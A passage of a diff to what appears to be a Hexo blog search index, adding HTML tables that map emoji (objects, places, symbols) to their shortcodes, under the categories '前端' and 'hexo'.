+<td style="text-align:left">📌 <code>:pushpin:</code></td>
+<td style="text-align:left">📎 <code>:paperclip:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">✒️ <code>:black_nib:</code></td>
+<td style="text-align:left">✏️ <code>:pencil2:</code></td>
+<td style="text-align:left">📏 <code>:straight_ruler:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📐 <code>:triangular_ruler:</code></td>
+<td style="text-align:left">📕 <code>:closed_book:</code></td>
+<td style="text-align:left">📗 <code>:green_book:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📘 <code>:blue_book:</code></td>
+<td style="text-align:left">📙 <code>:orange_book:</code></td>
+<td style="text-align:left">📓 <code>:notebook:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📔 <code>:notebook_with_decorative_cover:</code></td>
+<td style="text-align:left">📒 <code>:ledger:</code></td>
+<td style="text-align:left">📚 <code>:books:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔖 <code>:bookmark:</code></td>
+<td style="text-align:left">📛 <code>:name_badge:</code></td>
+<td style="text-align:left">🔬 <code>:microscope:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔭 <code>:telescope:</code></td>
+<td style="text-align:left">📰 <code>:newspaper:</code></td>
+<td style="text-align:left">🏈 <code>:football:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🏀 <code>:basketball:</code></td>
+<td style="text-align:left">⚽️ <code>:soccer:</code></td>
+<td style="text-align:left">⚾️ <code>:baseball:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎾 <code>:tennis:</code></td>
+<td style="text-align:left">🎱 <code>:8ball:</code></td>
+<td style="text-align:left">🏉 <code>:rugby_football:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎳 <code>:bowling:</code></td>
+<td style="text-align:left">⛳️ <code>:golf:</code></td>
+<td style="text-align:left">🚵 <code>:mountain_bicyclist:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚴 <code>:bicyclist:</code></td>
+<td style="text-align:left">🏇 <code>:horse_racing:</code></td>
+<td style="text-align:left">🏂 <code>:snowboarder:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🏊 <code>:swimmer:</code></td>
+<td style="text-align:left">🏄 <code>:surfer:</code></td>
+<td style="text-align:left">🎿 <code>:ski:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">♠️ <code>:spades:</code></td>
+<td style="text-align:left">♥️ <code>:hearts:</code></td>
+<td style="text-align:left">♣️ <code>:clubs:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">♦️ <code>:diamonds:</code></td>
+<td style="text-align:left">💎 <code>:gem:</code></td>
+<td style="text-align:left">💍 <code>:ring:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🏆 <code>:trophy:</code></td>
+<td style="text-align:left">🎼 <code>:musical_score:</code></td>
+<td style="text-align:left">🎹 <code>:musical_keyboard:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎻 <code>:violin:</code></td>
+<td style="text-align:left">👾 <code>:space_invader:</code></td>
+<td style="text-align:left">🎮 <code>:video_game:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🃏 <code>:black_joker:</code></td>
+<td style="text-align:left">🎴 <code>:flower_playing_cards:</code></td>
+<td style="text-align:left">🎲 <code>:game_die:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎯 <code>:dart:</code></td>
+<td style="text-align:left">🀄️ <code>:mahjong:</code></td>
+<td style="text-align:left">🎬 <code>:clapper:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📝 <code>:memo:</code></td>
+<td style="text-align:left">📝 <code>:pencil:</code></td>
+<td style="text-align:left">📖 <code>:book:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎨 <code>:art:</code></td>
+<td style="text-align:left">🎤 <code>:microphone:</code></td>
+<td style="text-align:left">🎧 <code>:headphones:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎺 <code>:trumpet:</code></td>
+<td style="text-align:left">🎷 <code>:saxophone:</code></td>
+<td style="text-align:left">🎸 <code>:guitar:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👞 <code>:shoe:</code></td>
+<td style="text-align:left">👡 <code>:sandal:</code></td>
+<td style="text-align:left">👠 <code>:high_heel:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💄 <code>:lipstick:</code></td>
+<td style="text-align:left">👢 <code>:boot:</code></td>
+<td style="text-align:left">👕 <code>:shirt:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👕 <code>:tshirt:</code></td>
+<td style="text-align:left">👔 <code>:necktie:</code></td>
+<td style="text-align:left">👚 <code>:womans_clothes:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👗 <code>:dress:</code></td>
+<td style="text-align:left">🎽 <code>:running_shirt_with_sash:</code></td>
+<td style="text-align:left">👖 <code>:jeans:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👘 <code>:kimono:</code></td>
+<td style="text-align:left">👙 <code>:bikini:</code></td>
+<td style="text-align:left">🎀 <code>:ribbon:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎩 <code>:tophat:</code></td>
+<td style="text-align:left">👑 <code>:crown:</code></td>
+<td style="text-align:left">👒 <code>:womans_hat:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👞 <code>:mans_shoe:</code></td>
+<td style="text-align:left">🌂 <code>:closed_umbrella:</code></td>
+<td style="text-align:left">💼 <code>:briefcase:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👜 <code>:handbag:</code></td>
+<td style="text-align:left">👝 <code>:pouch:</code></td>
+<td style="text-align:left">👛 <code>:purse:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">👓 <code>:eyeglasses:</code></td>
+<td style="text-align:left">🎣 <code>:fishing_pole_and_fish:</code></td>
+<td style="text-align:left">☕️ <code>:coffee:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍵 <code>:tea:</code></td>
+<td style="text-align:left">🍶 <code>:sake:</code></td>
+<td style="text-align:left">🍼 <code>:baby_bottle:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍺 <code>:beer:</code></td>
+<td style="text-align:left">🍻 <code>:beers:</code></td>
+<td style="text-align:left">🍸 <code>:cocktail:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍹 <code>:tropical_drink:</code></td>
+<td style="text-align:left">🍷 <code>:wine_glass:</code></td>
+<td style="text-align:left">🍴 <code>:fork_and_knife:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍕 <code>:pizza:</code></td>
+<td style="text-align:left">🍔 <code>:hamburger:</code></td>
+<td style="text-align:left">🍟 <code>:fries:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍗 <code>:poultry_leg:</code></td>
+<td style="text-align:left">🍖 <code>:meat_on_bone:</code></td>
+<td style="text-align:left">🍝 <code>:spaghetti:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍛 <code>:curry:</code></td>
+<td style="text-align:left">🍤 <code>:fried_shrimp:</code></td>
+<td style="text-align:left">🍱 <code>:bento:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍣 <code>:sushi:</code></td>
+<td style="text-align:left">🍥 <code>:fish_cake:</code></td>
+<td style="text-align:left">🍙 <code>:rice_ball:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍘 <code>:rice_cracker:</code></td>
+<td style="text-align:left">🍚 <code>:rice:</code></td>
+<td style="text-align:left">🍜 <code>:ramen:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍲 <code>:stew:</code></td>
+<td style="text-align:left">🍢 <code>:oden:</code></td>
+<td style="text-align:left">🍡 <code>:dango:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🥚 <code>:egg:</code></td>
+<td style="text-align:left">🍞 <code>:bread:</code></td>
+<td style="text-align:left">🍩 <code>:doughnut:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍮 <code>:custard:</code></td>
+<td style="text-align:left">🍦 <code>:icecream:</code></td>
+<td style="text-align:left">🍨 <code>:ice_cream:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍧 <code>:shaved_ice:</code></td>
+<td style="text-align:left">🎂 <code>:birthday:</code></td>
+<td style="text-align:left">🍰 <code>:cake:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍪 <code>:cookie:</code></td>
+<td style="text-align:left">🍫 <code>:chocolate_bar:</code></td>
+<td style="text-align:left">🍬 <code>:candy:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍭 <code>:lollipop:</code></td>
+<td style="text-align:left">🍯 <code>:honey_pot:</code></td>
+<td style="text-align:left">🍎 <code>:apple:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍏 <code>:green_apple:</code></td>
+<td style="text-align:left">🍊 <code>:tangerine:</code></td>
+<td style="text-align:left">🍋 <code>:lemon:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍒 <code>:cherries:</code></td>
+<td style="text-align:left">🍇 <code>:grapes:</code></td>
+<td style="text-align:left">🍉 <code>:watermelon:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍓 <code>:strawberry:</code></td>
+<td style="text-align:left">🍑 <code>:peach:</code></td>
+<td style="text-align:left">🍈 <code>:melon:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍌 <code>:banana:</code></td>
+<td style="text-align:left">🍐 <code>:pear:</code></td>
+<td style="text-align:left">🍍 <code>:pineapple:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🍠 <code>:sweet_potato:</code></td>
+<td style="text-align:left">🍆 <code>:eggplant:</code></td>
+<td style="text-align:left">🍅 <code>:tomato:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌽 <code>:corn:</code></td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+</tr>
+</tbody>
+</table>
+<p>Places</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">🏠 <code>:house:</code></th>
+<th style="text-align:left">🏡 <code>:house_with_garden:</code></th>
+<th style="text-align:left">🏫 <code>:school:</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">🏢 <code>:office:</code></td>
+<td style="text-align:left">🏣 <code>:post_office:</code></td>
+<td style="text-align:left">🏥 <code>:hospital:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🏦 <code>:bank:</code></td>
+<td style="text-align:left">🏪 <code>:convenience_store:</code></td>
+<td style="text-align:left">🏩 <code>:love_hotel:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🏨 <code>:hotel:</code></td>
+<td style="text-align:left">💒 <code>:wedding:</code></td>
+<td style="text-align:left">⛪️ <code>:church:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🏬 <code>:department_store:</code></td>
+<td style="text-align:left">🏤 <code>:european_post_office:</code></td>
+<td style="text-align:left">🌇 <code>:city_sunrise:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌆 <code>:city_sunset:</code></td>
+<td style="text-align:left">🏯 <code>:japanese_castle:</code></td>
+<td style="text-align:left">🏰 <code>:european_castle:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⛺️ <code>:tent:</code></td>
+<td style="text-align:left">🏭 <code>:factory:</code></td>
+<td style="text-align:left">🗼 <code>:tokyo_tower:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🗾 <code>:japan:</code></td>
+<td style="text-align:left">🗻 <code>:mount_fuji:</code></td>
+<td style="text-align:left">🌄 <code>:sunrise_over_mountains:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌅 <code>:sunrise:</code></td>
+<td style="text-align:left">🌠 <code>:stars:</code></td>
+<td style="text-align:left">🗽 <code>:statue_of_liberty:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🌉 <code>:bridge_at_night:</code></td>
+<td style="text-align:left">🎠 <code>:carousel_horse:</code></td>
+<td style="text-align:left">🌈 <code>:rainbow:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎡 <code>:ferris_wheel:</code></td>
+<td style="text-align:left">⛲️ <code>:fountain:</code></td>
+<td style="text-align:left">🎢 <code>:roller_coaster:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚢 <code>:ship:</code></td>
+<td style="text-align:left">🚤 <code>:speedboat:</code></td>
+<td style="text-align:left">⛵️ <code>:boat:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⛵️ <code>:sailboat:</code></td>
+<td style="text-align:left">🚣 <code>:rowboat:</code></td>
+<td style="text-align:left">⚓️ <code>:anchor:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚀 <code>:rocket:</code></td>
+<td style="text-align:left">✈️ <code>:airplane:</code></td>
+<td style="text-align:left">🚁 <code>:helicopter:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚂 <code>:steam_locomotive:</code></td>
+<td style="text-align:left">🚊 <code>:tram:</code></td>
+<td style="text-align:left">🚞 <code>:mountain_railway:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚲 <code>:bike:</code></td>
+<td style="text-align:left">🚡 <code>:aerial_tramway:</code></td>
+<td style="text-align:left">🚟 <code>:suspension_railway:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚠 <code>:mountain_cableway:</code></td>
+<td style="text-align:left">🚜 <code>:tractor:</code></td>
+<td style="text-align:left">🚙 <code>:blue_car:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚘 <code>:oncoming_automobile:</code></td>
+<td style="text-align:left">🚗 <code>:car:</code></td>
+<td style="text-align:left">🚗 <code>:red_car:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚕 <code>:taxi:</code></td>
+<td style="text-align:left">🚖 <code>:oncoming_taxi:</code></td>
+<td style="text-align:left">🚛 <code>:articulated_lorry:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚌 <code>:bus:</code></td>
+<td style="text-align:left">🚍 <code>:oncoming_bus:</code></td>
+<td style="text-align:left">🚨 <code>:rotating_light:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚓 <code>:police_car:</code></td>
+<td style="text-align:left">🚔 <code>:oncoming_police_car:</code></td>
+<td style="text-align:left">🚒 <code>:fire_engine:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚑 <code>:ambulance:</code></td>
+<td style="text-align:left">🚐 <code>:minibus:</code></td>
+<td style="text-align:left">🚚 <code>:truck:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚋 <code>:train:</code></td>
+<td style="text-align:left">🚉 <code>:station:</code></td>
+<td style="text-align:left">🚆 <code>:train2:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚅 <code>:bullettrain_front:</code></td>
+<td style="text-align:left">🚄 <code>:bullettrain_side:</code></td>
+<td style="text-align:left">🚈 <code>:light_rail:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚝 <code>:monorail:</code></td>
+<td style="text-align:left">🚃 <code>:railway_car:</code></td>
+<td style="text-align:left">🚎 <code>:trolleybus:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🎫 <code>:ticket:</code></td>
+<td style="text-align:left">⛽️ <code>:fuelpump:</code></td>
+<td style="text-align:left">🚦 <code>:vertical_traffic_light:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚥 <code>:traffic_light:</code></td>
+<td style="text-align:left">⚠️ <code>:warning:</code></td>
+<td style="text-align:left">🚧 <code>:construction:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔰 <code>:beginner:</code></td>
+<td style="text-align:left">🏧 <code>:atm:</code></td>
+<td style="text-align:left">🎰 <code>:slot_machine:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚏 <code>:busstop:</code></td>
+<td style="text-align:left">💈 <code>:barber:</code></td>
+<td style="text-align:left">♨️ <code>:hotsprings:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🏁 <code>:checkered_flag:</code></td>
+<td style="text-align:left">🎌 <code>:crossed_flags:</code></td>
+<td style="text-align:left">🏮 <code>:izakaya_lantern:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🗿 <code>:moyai:</code></td>
+<td style="text-align:left">🎪 <code>:circus_tent:</code></td>
+<td style="text-align:left">🎭 <code>:performing_arts:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📍 <code>:round_pushpin:</code></td>
+<td style="text-align:left">🚩 <code>:triangular_flag_on_post:</code></td>
+<td style="text-align:left"></td>
+</tr>
+</tbody>
+</table>
+<p>Symbols</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">1️⃣ <code>:one:</code></th>
+<th style="text-align:left">2️⃣ <code>:two:</code></th>
+<th style="text-align:left">3️⃣ <code>:three:</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">4️⃣ <code>:four:</code></td>
+<td style="text-align:left">5️⃣ <code>:five:</code></td>
+<td style="text-align:left">6️⃣ <code>:six:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">7️⃣ <code>:seven:</code></td>
+<td style="text-align:left">8️⃣ <code>:eight:</code></td>
+<td style="text-align:left">9️⃣ <code>:nine:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔟 <code>:keycap_ten:</code></td>
+<td style="text-align:left">🔢 <code>:1234:</code></td>
+<td style="text-align:left">0️⃣ <code>:zero:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">#️⃣ <code>:hash:</code></td>
+<td style="text-align:left">🔣 <code>:symbols:</code></td>
+<td style="text-align:left">◀️ <code>:arrow_backward:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⬇️ <code>:arrow_down:</code></td>
+<td style="text-align:left">▶️ <code>:arrow_forward:</code></td>
+<td style="text-align:left">⬅️ <code>:arrow_left:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔠 <code>:capital_abcd:</code></td>
+<td style="text-align:left">🔡 <code>:abcd:</code></td>
+<td style="text-align:left">🔤 <code>:abc:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">↙️ <code>:arrow_lower_left:</code></td>
+<td style="text-align:left">↘️ <code>:arrow_lower_right:</code></td>
+<td style="text-align:left">➡️ <code>:arrow_right:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⬆️ <code>:arrow_up:</code></td>
+<td style="text-align:left">↖️ <code>:arrow_upper_left:</code></td>
+<td style="text-align:left">↗️ <code>:arrow_upper_right:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⏬ <code>:arrow_double_down:</code></td>
+<td style="text-align:left">⏫ <code>:arrow_double_up:</code></td>
+<td style="text-align:left">🔽 <code>:arrow_down_small:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⤵️ <code>:arrow_heading_down:</code></td>
+<td style="text-align:left">⤴️ <code>:arrow_heading_up:</code></td>
+<td style="text-align:left">↩️ <code>:leftwards_arrow_with_hook:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">↪️ <code>:arrow_right_hook:</code></td>
+<td style="text-align:left">↔️ <code>:left_right_arrow:</code></td>
+<td style="text-align:left">↕️ <code>:arrow_up_down:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔼 <code>:arrow_up_small:</code></td>
+<td style="text-align:left">🔃 <code>:arrows_clockwise:</code></td>
+<td style="text-align:left">🔄 <code>:arrows_counterclockwise:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⏪ <code>:rewind:</code></td>
+<td style="text-align:left">⏩ <code>:fast_forward:</code></td>
+<td style="text-align:left">ℹ️ <code>:information_source:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🆗 <code>:ok:</code></td>
+<td style="text-align:left">🔀 <code>:twisted_rightwards_arrows:</code></td>
+<td style="text-align:left">🔁 <code>:repeat:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔂 <code>:repeat_one:</code></td>
+<td style="text-align:left">🆕 <code>:new:</code></td>
+<td style="text-align:left">🔝 <code>:top:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🆙 <code>:up:</code></td>
+<td style="text-align:left">🆒 <code>:cool:</code></td>
+<td style="text-align:left">🆓 <code>:free:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🆖 <code>:ng:</code></td>
+<td style="text-align:left">🎦 <code>:cinema:</code></td>
+<td style="text-align:left">🈁 <code>:koko:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">📶 <code>:signal_strength:</code></td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">🈂️ <code>:sa:</code></td>
+<td style="text-align:left">🚻 <code>:restroom:</code></td>
+<td style="text-align:left">🚹 <code>:mens:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚺 <code>:womens:</code></td>
+<td style="text-align:left">🚼 <code>:baby_symbol:</code></td>
+<td style="text-align:left">🚭 <code>:no_smoking:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🅿️ <code>:parking:</code></td>
+<td style="text-align:left">♿️ <code>:wheelchair:</code></td>
+<td style="text-align:left">🚇 <code>:metro:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🛄 <code>:baggage_claim:</code></td>
+<td style="text-align:left">🉑 <code>:accept:</code></td>
+<td style="text-align:left">🚾 <code>:wc:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚰 <code>:potable_water:</code></td>
+<td style="text-align:left">🚮 <code>:put_litter_in_its_place:</code></td>
+<td style="text-align:left">㊙️ <code>:secret:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">㊗️ <code>:congratulations:</code></td>
+<td style="text-align:left">Ⓜ️ <code>:m:</code></td>
+<td style="text-align:left">🛂 <code>:passport_control:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🛅 <code>:left_luggage:</code></td>
+<td style="text-align:left">🛃 <code>:customs:</code></td>
+<td style="text-align:left">🉐 <code>:ideograph_advantage:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🆑 <code>:cl:</code></td>
+<td style="text-align:left">🆘 <code>:sos:</code></td>
+<td style="text-align:left">🆔 <code>:id:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚫 <code>:no_entry_sign:</code></td>
+<td style="text-align:left">🔞 <code>:underage:</code></td>
+<td style="text-align:left">📵 <code>:no_mobile_phones:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚯 <code>:do_not_litter:</code></td>
+<td style="text-align:left">🚱 <code>:non-potable_water:</code></td>
+<td style="text-align:left">🚳 <code>:no_bicycles:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🚷 <code>:no_pedestrians:</code></td>
+<td style="text-align:left">🚸 <code>:children_crossing:</code></td>
+<td style="text-align:left">⛔️ <code>:no_entry:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">✳️ <code>:eight_spoked_asterisk:</code></td>
+<td style="text-align:left">✴️ <code>:eight_pointed_black_star:</code></td>
+<td style="text-align:left">💟 <code>:heart_decoration:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🆚 <code>:vs:</code></td>
+<td style="text-align:left">📳 <code>:vibration_mode:</code></td>
+<td style="text-align:left">📴 <code>:mobile_phone_off:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💹 <code>:chart:</code></td>
+<td style="text-align:left">💱 <code>:currency_exchange:</code></td>
+<td style="text-align:left">♈️ <code>:aries:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">♉️ <code>:taurus:</code></td>
+<td style="text-align:left">♊️ <code>:gemini:</code></td>
+<td style="text-align:left">♋️ <code>:cancer:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">♌️ <code>:leo:</code></td>
+<td style="text-align:left">♍️ <code>:virgo:</code></td>
+<td style="text-align:left">♎️ <code>:libra:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">♏️ <code>:scorpius:</code></td>
+<td style="text-align:left">♐️ <code>:sagittarius:</code></td>
+<td style="text-align:left">♑️ <code>:capricorn:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">♒️ <code>:aquarius:</code></td>
+<td style="text-align:left">♓️ <code>:pisces:</code></td>
+<td style="text-align:left">⛎ <code>:ophiuchus:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔯 <code>:six_pointed_star:</code></td>
+<td style="text-align:left">❎ <code>:negative_squared_cross_mark:</code></td>
+<td style="text-align:left">🅰️ <code>:a:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🅱️ <code>:b:</code></td>
+<td style="text-align:left">🆎 <code>:ab:</code></td>
+<td style="text-align:left">🅾️ <code>:o2:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💠 <code>:diamond_shape_with_a_dot_inside:</code></td>
+<td style="text-align:left">♻️ <code>:recycle:</code></td>
+<td style="text-align:left">🔚 <code>:end:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔛 <code>:on:</code></td>
+<td style="text-align:left">🔜 <code>:soon:</code></td>
+<td style="text-align:left">🕐 <code>:clock1:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🕜 <code>:clock130:</code></td>
+<td style="text-align:left">🕙 <code>:clock10:</code></td>
+<td style="text-align:left">🕥 <code>:clock1030:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🕚 <code>:clock11:</code></td>
+<td style="text-align:left">🕦 <code>:clock1130:</code></td>
+<td style="text-align:left">🕛 <code>:clock12:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🕧 <code>:clock1230:</code></td>
+<td style="text-align:left">🕑 <code>:clock2:</code></td>
+<td style="text-align:left">🕝 <code>:clock230:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🕒 <code>:clock3:</code></td>
+<td style="text-align:left">🕞 <code>:clock330:</code></td>
+<td style="text-align:left">🕓 <code>:clock4:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🕟 <code>:clock430:</code></td>
+<td style="text-align:left">🕔 <code>:clock5:</code></td>
+<td style="text-align:left">🕠 <code>:clock530:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🕕 <code>:clock6:</code></td>
+<td style="text-align:left">🕡 <code>:clock630:</code></td>
+<td style="text-align:left">🕖 <code>:clock7:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🕢 <code>:clock730:</code></td>
+<td style="text-align:left">🕗 <code>:clock8:</code></td>
+<td style="text-align:left">🕣 <code>:clock830:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🕘 <code>:clock9:</code></td>
+<td style="text-align:left">🕤 <code>:clock930:</code></td>
+<td style="text-align:left">💲 <code>:heavy_dollar_sign:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">©️ <code>:copyright:</code></td>
+<td style="text-align:left">®️ <code>:registered:</code></td>
+<td style="text-align:left">™️ <code>:tm:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">❌ <code>:x:</code></td>
+<td style="text-align:left">❗️ <code>:heavy_exclamation_mark:</code></td>
+<td style="text-align:left">‼️ <code>:bangbang:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⁉️ <code>:interrobang:</code></td>
+<td style="text-align:left">⭕️ <code>:o:</code></td>
+<td style="text-align:left">✖️ <code>:heavy_multiplication_x:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">➕ <code>:heavy_plus_sign:</code></td>
+<td style="text-align:left">➖ <code>:heavy_minus_sign:</code></td>
+<td style="text-align:left">➗ <code>:heavy_division_sign:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">💮 <code>:white_flower:</code></td>
+<td style="text-align:left">💯 <code>:100:</code></td>
+<td style="text-align:left">✔️ <code>:heavy_check_mark:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">☑️ <code>:ballot_box_with_check:</code></td>
+<td style="text-align:left">🔘 <code>:radio_button:</code></td>
+<td style="text-align:left">🔗 <code>:link:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">➰ <code>:curly_loop:</code></td>
+<td style="text-align:left">〰️ <code>:wavy_dash:</code></td>
+<td style="text-align:left">〽️ <code>:part_alternation_mark:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔱 <code>:trident:</code></td>
+<td style="text-align:left">🔻 <code>:small_red_triangle_down:</code></td>
+<td style="text-align:left">🔺 <code>:small_red_triangle:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">✅ <code>:white_check_mark:</code></td>
+<td style="text-align:left">🔲 <code>:black_square_button:</code></td>
+<td style="text-align:left">🔳 <code>:white_square_button:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">⚫️ <code>:black_circle:</code></td>
+<td style="text-align:left">⚪️ <code>:white_circle:</code></td>
+<td style="text-align:left">🔴 <code>:red_circle:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔵 <code>:large_blue_circle:</code></td>
+<td style="text-align:left">🔷 <code>:large_blue_diamond:</code></td>
+<td style="text-align:left">🔶 <code>:large_orange_diamond:</code></td>
+</tr>
+<tr>
+<td style="text-align:left">🔹 <code>:small_blue_diamond:</code></td>
+<td style="text-align:left">🔸 <code>:small_orange_diamond:</code></td>
+<td style="text-align:left"></td>
+</tr>
+</tbody>
+</table>
+]]></content>
+      <categories>
+        <category>前端</category>
+        <category>hexo</category>
       </categories>
   </entry>
 </search>
